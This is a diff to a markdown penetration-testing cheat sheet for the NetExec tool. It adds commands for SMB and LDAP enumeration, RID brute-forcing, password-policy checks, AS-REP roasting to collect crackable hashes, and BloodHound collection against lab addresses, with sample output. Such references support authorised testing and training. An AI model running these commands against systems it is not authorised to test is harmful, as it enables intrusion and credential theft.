@@ -93,29 +93,29 @@ NXC = maintained CME-style network execution and enumeration tool for Windows &A
 **Single user credential check on single host**
 
 ```bash
-netexec smb 192.168.111.137 -u <USERNAME> -p '<PASSWORD>'
+netexec smb 192.168.111.137 -u username -p 'password'
 
 SMB  192.168.111.137  445  <HOSTNAME>  [*] Windows 10 / Server 2019 Build 19041 x64 (name:<HOSTNAME>) (domain:<DOMAIN>) (signing:False) (SMBv1:False)  
-SMB  192.168.111.137  445  <HOSTNAME>  [+] <DOMAIN>\<USERNAME>:<PASSWORD>
+SMB  192.168.111.137  445  <HOSTNAME>  [+] <DOMAIN>\username:password
 ```
 
 Local authentication 
 ```bash
-netexec smb 192.168.111.137 -u <USERNAME> -p '<PASSWORD>' --local-auth
+netexec smb 192.168.111.137 -u username -p 'password' --local-auth
 ```
 
 domain authentication
 ```bash
-netexec smb 192.168.111.137 -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN>
+netexec smb 192.168.111.137 -u username -p 'password' -d <DOMAIN>
 ```
 
 ### SMB shares enumeration
 
 ```bash
-netexec smb 192.168.111.137 -u <USERNAME> -p '<PASSWORD>' --shares
+netexec smb 192.168.111.137 -u username -p 'password' --shares
 
 
-SMB  192.168.111.137  445  <HOSTNAME>  [+] <DOMAIN>\<USERNAME>:<PASSWORD> (Pwn3d!)  
+SMB  192.168.111.137  445  <HOSTNAME>  [+] <DOMAIN>\username:password (Pwn3d!)  
 SMB  192.168.111.137  445  <HOSTNAME>  [+] Enumerated shares  
 SMB  192.168.111.137  445  <HOSTNAME>  Share    Permissions  Remark  
 SMB  192.168.111.137  445  <HOSTNAME>  ADMIN$   READ,WRITE   Remote Admin  
@@ -126,17 +126,32 @@ SMB  192.168.111.137  445  <HOSTNAME>  IPC$     READ         Remote IPC
 other protocols 
 ```bash
 # winrm
-netexec winrm <TARGET_IP> -u <USERNAME> -p '<PASSWORD>'
+netexec winrm <TARGET_IP> -u username -p 'password'
 
 # ldap
-netexec ldap <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN>
+netexec ldap <TARGET_IP> -u username -p 'password' -d <DOMAIN>
 
 # mssql
-netexec mssql <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN>
+netexec mssql <TARGET_IP> -u username -p 'password' -d <DOMAIN>
 
 # rdp
-netexec rdp <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN>
+netexec rdp <TARGET_IP> -u username -p 'password' -d <DOMAIN>
 ```
+
+RID brute-force / user discovery <- useful with high privilege credentials! 
+```bash
+netexec smb target_ip -u username -p 'password' --rid-brute
+```
+- enumerate likely domain users over SMB
+
+list users 
+```bash
+netexec smb target_ip --users
+```
+- username discovery
+- building spray / validation lists
+- identifying likely service or admin accounts
+
 
 [`nxc_bloop.sh`](./scripts/nxc_bloop.sh) to loop through different commands more easily! 
 
@@ -190,6 +205,61 @@ change timeout to prevent wasting time on a service that hangs and/or is filtere
 ```bash
 ./nxc_bloop.sh -t 192.168.111.137 -P smb,ldap,mssql -u alice -p 'password' --auth domain -d domain.com --timeout 15
 ```
+
+
+### Password policy
+
+Check the domain password policy early if SMB is reachable:  
+```bash  
+netexec smb target_ip --pass-pol
+```
+- lockout awareness
+- safer spraying decisions
+- understanding password complexity / length requirements
+
+### LDAP query without credentials
+
+```bash
+netexec ldap target_ip -u '' -p '' --query "(objectClass=*)" "*"
+```
+- quick AD object discovery
+- testing whether anonymous LDAP binds are allowed
+
+
+### AS-REP roasting
+
+usernames found -> check for those that don't require pre-auth
+```bash
+netexec ldap target_ip -u users.txt -p '' --asreproast
+```
+- obtaining crackable AS-REP roast hashes
+- identifying weakly configured domain accounts
+
+
+### LDAP enumeration after gaining credentials
+
+```bash
+netexec ldap target_ip -u username -p 'password' --query "(objectClass=*)" "*"
+```
+- finding higher-value users
+- collecting additional credential material
+- understanding domain structure better
+
+### BloodHound
+
+domain credentials found -> get Bloodhound data 
+```bash
+netexec ldap target_ip -u username -p 'password' --bloodhound -c All -ns target_ip
+
+LDAP target_ip 389 dc01 [*] Windows Server / Domain Controller info...  
+LDAP target_ip 389 dc01 [+] domain.com\username:password  
+LDAP target_ip 389 dc01 [*] Running BloodHound collection with methods: All  
+LDAP target_ip 389 dc01 [*] Resolving objects via DNS server: target_ip  
+LDAP target_ip 389 dc01 [+] BloodHound collection completed
+```
+- graphing attack paths
+- identifying ACL abuse, delegation, and privilege escalation routes
+
 
 ---
 
